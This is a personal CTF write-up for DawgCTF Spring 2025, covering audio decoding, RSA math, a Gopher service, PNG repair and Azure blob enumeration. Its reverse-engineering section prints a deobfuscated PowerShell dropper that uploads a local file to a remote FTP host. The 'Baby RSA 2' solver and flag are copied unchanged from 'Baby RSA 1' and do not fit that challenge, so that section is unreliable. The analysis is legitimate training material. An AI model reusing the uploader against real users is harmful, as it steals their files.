## Misc
There where 14 Challanges in total.
### Challange Files?
>Looking for all the files you might need for this event?
>You can find it all here on our GitHub: UMBCCyberDawgs/dawgctf-sp25
>For each problem that needs a file, you will find the direct download link on that problem's description as well!
>You may also clone everything at once if you want by cloning the whole repo!
>Now take a look at the hint right next to the textbox ;)

For this Challange we simply need to check for the "Hints" and find the flag.

FLAG: `DawgCTF{woah_files?}`

---


### Discord Challange
>There's a flag waiting for you in the DawgCTF Discord. Can you find it?

As in almost every CTF, we need to join their Discord Server and find a flag. In this case the flag was in the flag channel. 

FLAG: `DawgCTF{3nj0y_th3_c0mp3t1t10n!}`

---

### Don’t Forget About the Hints!
>If a challenge has a hint, press the (?) button to the left of the submit field to view it.

This is as simple as the Challange say's. Just look at the hint and get the Flag.

FLAG: `DawgCTF{nice_job_thats_the_hint}`

---

### Don’t Touch My Fone
>Looks like someone's dialing a phone number, see if you can figure out what it is! The flag format is the decoded phone number wrapped in DawgCTF{} with no formatting, so if the number is 123-456-7890, then the flag is DawgCTF{1234567890}.

We are given a file called `dtmf.wav`. After a quick research i found out, that dtfm stands for Dual-Tone 
Multi-Frequency. If you here the sound of the file it sounds like these tones that a Phone makes when you press 
the number buttons. 
I found this website where you can Upload a dtmf file and it decodes it. 

![DTMF Decoder](/assets/img/dawgCTF/dtmf_decode.png)

FLAG: `DawgCTF{4104553500}`

---

### Mystery Signal 1
>I was listening to my scanner when I heard a strange signal. Can you decode it?

We were given a file called `MysterySignal_1.wav`. If we listen to the file it sounds like morse code. We can upload the file to an morse code decoder and hopefully get the message.

![Mystery Signal1](/assets/img/dawgCTF/signal1.png)

FLAG: `DawgCTF{LISTENCAREFULLY}`

---

### Spectral Secrets
> I was downloading some music from Limewire and came across a strange file. Can you help me figure out what it is?

Since we have the hint of the challange name that it has to to something with Spectral alaysis, I always try to upload the file to decoding tools like online Spectrum Decoder. And we can see the flag.

![Spectrum Analysis](/assets/img/dawgCTF/spectrum.png)

FLAG: `DawgCTF{4ud4c17y_my_b3l0v3D}`

---

### Caddyshack
> locate and connect to the server running on caddyshack.umbccd.net

I first tried to visit the page through a web browser, but this failed. I also tried to ping the domain, but this was also not successfull. 
I then wantet to see which ports are open and performed a nmap scan.

![nmap scan](/assets/img/dawgCTF/nmap.png)

The scanned showed me that port 70 is open and the Gopher protocol is running. Now that we know this we can connect to the domain with netcat (nc) over port 70.

![gopher output](/assets/img/dawgCTF/gopher.png)

We see that there is the flag and we just need to view the file which is located at `/Flag.txt`.
After that we get the flag.

![gopher flag](/assets/img/dawgCTF/gopher_flag.png)

FLAG: `DawgCTF{60ph3r_15_n07_d34d!}`

## Cryptography

### Baby RSA 1
> You think your Algebra skills are pretty good huh? Well let's test it out.


We are given a source code which performs operations using RSA encryption and random arithmetic expressions involving the prime factors of the RSA modulus. 

```python
from Crypto.Util.number import *
from sage.all import randint

p = getPrime(512)
q = getPrime(512)
N = p * q

e = 0x10001

m = bytes_to_long(b"DawgCTF{fake_flag}")

c = pow(m, e, N)

print("N =", N)
print("e =", e)
print("ct =", c)
print()

a = randint(0, 2**100)
b = randint(0, 2**100)
c = randint(0, 2**100)
d = randint(0, 2**100)

x = a * p + b * q
y = c * p + d * q

print("a =", a)
print("b =", b)
print("c =", c)
print("d =", d)
print()
print("x =", x)
print("y =", y)
```

1. RSA Key Generation
2. RSA Encryption
3. Output the Public Key and Ciphertext
4. Generate Random Linear Combinations of p and q
5. Output Random Values and Their Linear Combinations

The output file looks like this:

```text

```

Given:
- N — RSA modulus (p * q)
- e — public exponent (65537)
- ct — RSA-encrypted ciphertext
- x = a * p + b * q
- y = c * p + d * q

We want to recover the message `m = ct^d mod N`, where `d` is the private exponent

But to compute d, we need the prime factors p and q of N. 

We can write a python script for that.

```python
# Step 1: Solve for p and q
# Solve the 2x2 system manually using basic modular math

# Calculate the determinant
det = a * d - b * c
det_inv = pow(det, -1, N)  # modular inverse of the determinant mod N

# Solve for p and q using Cramer's rule
p = ((d * x - b * y) * det_inv) % N
q = ((-c * x + a * y) * det_inv) % N

print("[+] Recovered primes:")
print(f"p = {p}")
print(f"q = {q}")

# Step 2: Compute private exponent d
phi = (p - 1) * (q - 1)
d_priv = inverse(e, phi)

# Step 3: Decrypt ciphertext
m = pow(ct, d_priv, N)

# Step 4: Convert to readable bytes
flag = long_to_bytes(m)
print("\n[+] FLAG:", flag.decode())
```

If we run this script we get the flag.

FLAG: `DawgCTF{wh0_s41d_m4th_15_us3l3ss?}`

---

### Baby RSA 2
> If all I have to do is keep my factors p and q secret, then I can save computation time by sharing the same modulus between all my friends. I'll give them unique e and d pairs to encrypt and decrypt messages. Sounds secure to me!

After analysing the script we can write the solver. 

```python
# Step 1: Solve for p and q
# Solve the 2x2 system manually using basic modular math

# Calculate the determinant
det = a * d - b * c
det_inv = pow(det, -1, N)  # modular inverse of the determinant mod N

# Solve for p and q using Cramer's rule
p = ((d * x - b * y) * det_inv) % N
q = ((-c * x + a * y) * det_inv) % N

print("[+] Recovered primes:")
print(f"p = {p}")
print(f"q = {q}")

# Step 2: Compute private exponent d
phi = (p - 1) * (q - 1)
d_priv = inverse(e, phi)

# Step 3: Decrypt ciphertext
m = pow(ct, d_priv, N)

# Step 4: Convert to readable bytes
flag = long_to_bytes(m)
print("\n[+] FLAG:", flag.decode())
```

Run the script and we get the flag.

FLAG: `DawgCTF{wh0_s41d_m4th_15_us3l3ss?}`

### The Birds
> You think you're being watched, and you see a suspicious flock of birds on the powerlines outside of your house each morning. You think the feds are trying to tell you something. Separate words with underscores and encase in DawgCTF{}. All lowercase.


We are also given this picture.

![Birds](/assets/img/dawgCTF/birds.png)

After some research I found out that this is the `Birds on a wire cipher` and we can decode it manually using this picture.

![Birds decode](/assets/img/dawgCTF/birds_decode.png)

FLAG: `DawgCTF{THEREISNOESCAPE}`

---

### Cantor's Paradox
> Now that I have encrypted my flag with a new math function I was just researching I can know share it with my friend Cantor and no one will know how to read it except us!

We are given with python script.

```python
from sage.all import sqrt, floor
from secret import flag

def getTriNumber(n):
    return n * (n + 1) // 2  # Ensure integer division

def pair(n1, n2):
    S = n1 + n2
    return getTriNumber(S) + n2

def pair_array(arr):
    result = []
    for i in range(0, len(arr), 2):
        result.append(pair(arr[i], arr[i + 1]))    
    return result

def pad_to_power_of_two(arr):
    result = arr
    n = len(result)
    while (n & (n - 1)) != 0:
        result.append(0)
        n += 1
    return result
    
flag = [ord(f) for f in flag]  
flag = pad_to_power_of_two(flag)

temp = flag
for i in range(6):
    temp = pair_array(temp)

print("Encoded:", temp)
```
This code implements a custom recursive pairing function that encodes a flag (string) into a single number.
We also have the encrypted flag.

```text
flag = 4036872197130975885183239290191447112180924008343518098638033545535893348884348262766810360707383741794721392226291497314826201270847784737584016
```

We can write a script to compute the original flag.

```python
from math import isqrt

# The final encoded number you were given
encoded = [4036872197130975885183239290191447112180924008343518098638033545535893348884348262766810360707383741794721392226291497314826201270847784737584016]

# Inverse function of getTriNumber
def reverse_pair(n):
    """
    Given a single paired number, return (n1, n2)
    """
    # Inverse triangular number logic
    # Remember: original pair was (getTriNumber(S) + n2)
    # So:
    temp = n
    # Solve for S using the inverse triangular number formula
    S = (isqrt(8 * temp + 1) - 1) // 2
    T = S * (S + 1) // 2
    n2 = temp - T
    n1 = S - n2
    return n1, n2

def unpair_array(arr):
    """
    Reverse one round of pairing
    """
    result = []
    for num in arr:
        n1, n2 = reverse_pair(num)
        result.extend([n1, n2])
    return result

# Now we reverse 6 rounds
temp = encoded
for _ in range(6):
    temp = unpair_array(temp)

# Now temp contains ASCII codes
# Remove padding zeros (if any at the end)
while temp[-1] == 0:
    temp.pop()

# Convert to string
flag = ''.join(chr(x) for x in temp)
print("[+] Decoded Flag:", flag)
```

If we run the script we get the flag.

FLAG: `Dawg{1_pr3f3r_4ppl3s_t0_pa1rs_4nyw2y5}`

## Reverse Engineering

### Suspicious Script
>I was on a site looking for homework help. They offer this tool that I installed and they suggest running it to help solve my assignment. The file ends in .ps1 and I am unfamiliar with it. Can you check it out for me?
>The flag starts with DawgCTF{...}

We are given a powershell script. If we view what is inside we see a huge base64 decoded payload.

```powershell
$6=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbaSe64stRIng('JAB7ACEAfQA9AFsAQwBIAGEAcgBdADEAMAA1ADsAJABhAD0AWwBTAHkAUwBUAEUAbQAuAHQARQBYAHQALgBFAG4AQwBvAEQAaQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQARQAu............AIAB8ACAAJgAoACIAJAB7ACEAfQBlACQAewBAAH0AIgApAA=='))
& ([char]105+[char]101+[char]120) $6
```

I treid to decode that base64 string and got another base64 decoded string. 

```powershell
${!}=[CHar]105;$a=[SySTEm.tEXt.EnCoDing]::UNicOdE.gEtStRing([coNVerT]::FrOmbase64stRIng('fQB0AGkAeABlAHsAaABjAHQ.....B7AHkAcgB0AA=='));${@} ="x";$b=$a.ToCharArray();[arRaY]::rEVerSe($b);($b -JoIn "") | &("${!}e${@}")
```

I did the same again and decoded that string. This leaves us with a new piece of characters.

```text
}tixe{hctac};)F$ ,iru$(eliFdaolpU.lcw$;ptf$ tsiLtnemugrA- irU.metsyS emaNepyT- tcejbO-weN=iru$;tneilCbeW.teN.metsyS emaNepyT- tcejbO-weN=lcw$;"piz.ssap/ni/}!5tp1c5_depp4rW{FTCgwaD@yracs:resu//:ptf"=ptf$;611]raHC[+021]raHC[+611]raHC[+64]raHC[+521]raHC[+611]raHC[+211]raHC[+94]raHC[+411]raHC[+99]raHC[+35]raHC[+59]raHC[+511]raHC[+211]raHC[+59]raHC[+001]raHC[+15]raHC[+001]raHC[+84]raHC[+99]raHC[+011]raHC[+15]raHC[+321]raHC[+511]raHC[+911]raHC[+79]raHC[+08]raHC[+29]raHC[+85]raHC[+76]raHC[=F${yrt
```
It looks like the text is reverse so we can re-reverse it and get this code.

```powershell
try{$F=[CHar]67+[CHar]58+[CHar]92+[CHar]80+[CHar]97+[CHar]119+[CHar]115+[CHar]123+[CHar]51+[CHar]110+[CHar]99+[CHar]48+[CHar]100+[CHar]51+[CHar]100+[CHar]95+[CHar]112+[CHar]115+[CHar]95+[CHar]53+[CHar]99+[CHar]114+[CHar]49+[CHar]112+[CHar]116+[CHar]125+[CHar]46+[CHar]116+[CHar]120+[CHar]116;$ftp="ftp://user:scary@DawgCTF{Wr4pped_5c1pt5!}/in/pass.zip";$wcl=New-Object -TypeName System.Net.WebClient;$uri=New-Object -TypeName System.Uri -ArgumentList $ftp;$wcl.UploadFile($uri, $F);}catch{exit}
```

And there is the flag embedded in.

FLAG: `DawgCTF{Wr4pped_5c1pt5!}`

## OSINT
All OSINT Challanges I solved where part of the `GEOSINT`. So basically you have to play the game Geo-Guesser and if you are close enough the flag is printed.

## Foreniscs

### Chunked Integrity
> This is one of my favorite images! Unfortunately something has gone wrong and I cant see the whole thing, can you help fix it?

I inspected the PNG chunks. A typical layout is IHDR, sRGB, gAMA, IDAT (image data), and IEND.
But this file contained a chunk called EDAT. Since this looks like a misspelled IDAT i opened the file in the hex editor and changed it. 

After that the image contained the flag.

![cat](/assets/img/dawgCTF/hex_cat.png)

FLAG: `DawgCTF{C0rrup7_Chunkz}`


### Pinpoint 1
>I use a plastic card and pin to log in for work. I seem to have forgotten it and the process to change it is a real hassle. Luckily I capture the USB interfaces on my computer for this very reason! Can you recover my pin from this capture? Wrap the pin in DawgCTF{}

We got a PCAP file, so the first move is wireshark. There were not much usefull informations on the first look. I the run `strings`on the file and got this output.

![pacap strings](/assets/img/dawgCTF/pcap_strings.png)

Since we are looking for a Pin I just tried every Pin out and one was correct. 

FLAG: `DawgCTF{7901}`

## Web

### My Aquarium

After analysing the website i found and endpoint which leads to an azure blob storage. 
I used curl to view the contents behind.

`curl -X GET "https://onlineaquarium.blob.core.windows.net/aquarium?restype=container&comp=list"` 

And got back this XML document.

```xml
<?xml version="1.0" encoding="utf-8"?><EnumerationResults ContainerName="https://onlineaquarium.blob.core.windows.net/aquarium"><Blobs><Blob><Name>resources</Name><Url>https://onlineaquarium.blob.core.windows.net/aquarium/resources</Url><Properties><Last-Modified>Wed, 16 Apr 2025 07:48:21 GMT</Last-Modified><Etag>0x8DD7CBB0F12BBEC</Etag><Content-Length>0</Content-Length><Content-Type /><Content-Encoding /><Content-Language /><Content-MD5 /><Cache-Control /><BlobType>BlockBlob</BlobType><LeaseStatus>unlocked</LeaseStatus></Properties></Blob><Blob><Name>resources/SecretFavoriteSeaAnimal.txt</Name><Url>https://onlineaquarium.blob.core.windows.net/aquarium/resources/SecretFavoriteSeaAnimal.txt</Url><Properties><Last-Modified>Wed, 16 Apr 2025 07:48:21 GMT</Last-Modified><Etag>0x8DD7CBB0F15038C</Etag><Content-Length>28</Content-Length><Content-Type>text/plain</Content-Type><Content-Encoding /><Content-Language /><Content-MD5>irIHHF3wApb7LiOVHURmCg==</Content-MD5><Cache-Control /><BlobType>BlockBlob</BlobType><LeaseStatus>unlocked</LeaseStatus></Properties></Blob><Blob><Name>resources/sea-animal-facts.txt</Name><Url>https://onlineaquarium.blob.core.windows.net/aquarium/resources/sea-animal-facts.txt</Url><Properties><Last-Modified>Wed, 16 Apr 2025 08:12:56 GMT</Last-Modified><Etag>0x8DD7CBE7E9AAC14</Etag><Content-Length>1960</Content-Length><Content-Type>text/plain</Content-Type><Content-Encoding /><Content-Language /><Content-MD5>ejE+bAYsb+icl31G1LNaHw==</Content-MD5><Cache-Control /><BlobType>BlockBlob</BlobType><LeaseStatus>unlocked</LeaseStatus></Properties></Blob></Blobs><NextMarker /></EnumerationResults>
```

If we analyse this XML we find an interesting endpoint `SecretFavoriteSeaAnimal.txt`. If we curl to that exact domain we get the flag.

`curl https://onlineaquarium.blob.core.windows.net/aquarium/resources/SecretFavoriteSeaAnimal.txt`


FLAG: `DawgCTF{Bl0b_F15h_4re_S1lly}`
